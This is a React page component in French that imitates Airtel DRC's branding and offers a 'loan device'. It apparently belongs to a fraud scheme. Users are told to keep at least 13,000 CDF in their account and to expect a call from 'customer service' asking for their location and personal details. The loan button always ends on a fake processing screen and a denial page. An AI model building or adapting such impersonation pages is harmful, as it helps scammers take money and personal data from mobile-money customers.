import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelLoanLimit() {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);

  const handleContinue = () => {
    setIsProcessing(true);
  };

  // After 3 seconds of processing, redirect to the denied page
  useEffect(() => {
    if (!isProcessing) return;
    const t = setTimeout(() => {
      navigate('/airtel-denied');
    }, 3000);
    return () => clearTimeout(t);
  }, [isProcessing, navigate]);

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel DRC</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        {/* Back Link */}
        <button className="airtel-back-link" onClick={() => navigate(-1)} disabled={isProcessing}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Retour
        </button>

        <h2 className="airtel-limit-heading">Votre appareil de prêt</h2>
        <p className="airtel-limit-subtext">
          Voici les étapes à suivre pour obtenir votre appareil :
        </p>

        {/* Steps */}
        <div className="airtel-steps">
          <p className="airtel-step">
            1. Avant de cliquer sur « Demander », assurez-vous que votre compte
            Airtel dispose d'au moins 13 000 CDF. Dans le cas contraire, veuillez
            effectuer un dépôt.
          </p>

          <p className="airtel-step">
            2. Cliquez sur « Demander » si votre compte dispose d'au moins
            13 000 CDF.
          </p>

          <p className="airtel-step airtel-step-note">
            **Remarque : Aucun montant ne sera prélevé avant la réception de
            votre appareil.
          </p>

          <p className="airtel-step">
            3. Vous recevrez un appel du service client d'Airtel. Il vous sera
            demandé de fournir votre localisation ainsi que vos informations
            personnelles.
          </p>

          <p className="airtel-step">
            4. L'appareil vous sera livré, ou vous pourrez le récupérer dans
            notre magasin.
          </p>
        </div>

        {/* Continue Button */}
        <button
          className="airtel-continue-btn"
          onClick={handleContinue}
          disabled={isProcessing}
          style={isProcessing ? { backgroundColor: '#9CA3AF', cursor: 'wait' } : undefined}
        >
          {isProcessing ? 'Traitement en cours......' : 'Continuer pour obtenir le prêt'}
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="5" y1="12" x2="19" y2="12"></line>
            <polyline points="12 5 19 12 12 19"></polyline>
          </svg>
        </button>
      </div>

      {/* ---- PROCESSING MODAL ---- */}
      {isProcessing && (
        <div className="airtel-modal-overlay">
          <div className="airtel-modal">
            {/* Red dashed spinner */}
            <div className="airtel-modal-spinner" />

            <h3 className="airtel-modal-title">Traitement en cours...</h3>
            <p className="airtel-modal-subtext">
              Veuillez patienter pendant que nous vérifions votre demande de prêt...
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

export default AirtelLoanLimit;